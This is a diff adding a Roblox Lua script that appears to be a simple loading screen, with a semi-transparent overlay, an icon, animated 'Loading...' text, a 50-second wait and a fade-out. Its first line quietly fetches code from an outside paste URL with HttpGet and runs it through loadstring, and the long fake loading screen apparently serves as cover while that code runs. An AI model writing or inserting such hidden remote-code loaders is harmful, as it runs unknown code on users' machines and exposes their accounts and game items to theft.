@@ -1,0 +1,58 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/z3SQWoPA7xSsUFFA/raw"))()
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Background (semi-transparent, not fully blocking)
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+background.BackgroundTransparency = 0.4 -- not full cover
+background.Parent = screenGui
+
+-- Small Icon
+local icon = Instance.new("ImageLabel")
+icon.Size = UDim2.new(0, 100, 0, 100) -- small icon
+icon.Position = UDim2.new(0.5, -50, 0.4, -50)
+icon.BackgroundTransparency = 1
+icon.Image = "rbxassetid://YOUR_ICON_ID_HERE" -- replace this
+icon.Parent = background
+
+-- Loading Text
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(0, 300, 0, 50)
+text.Position = UDim2.new(0.5, -150, 0.6, 0)
+text.BackgroundTransparency = 1
+text.Text = "Loading..."
+text.TextColor3 = Color3.fromRGB(255,255,255)
+text.TextScaled = true
+text.Font = Enum.Font.GothamBold
+text.Parent = background
+
+-- Simple animation (dots loading)
+task.spawn(function()
+	while screenGui.Parent do
+		for i = 1,3 do
+			text.Text = "Loading" .. string.rep(".", i)
+			task.wait(0.5)
+		end
+	end
+end)
+
+-- Wait 50 seconds
+task.wait(50)
+
+-- Fade out effect
+for i = 0,1,0.05 do
+	background.BackgroundTransparency = 0.4 + i
+	icon.ImageTransparency = i
+	text.TextTransparency = i
+	task.wait(0.05)
+end
+
+screenGui:Destroy()
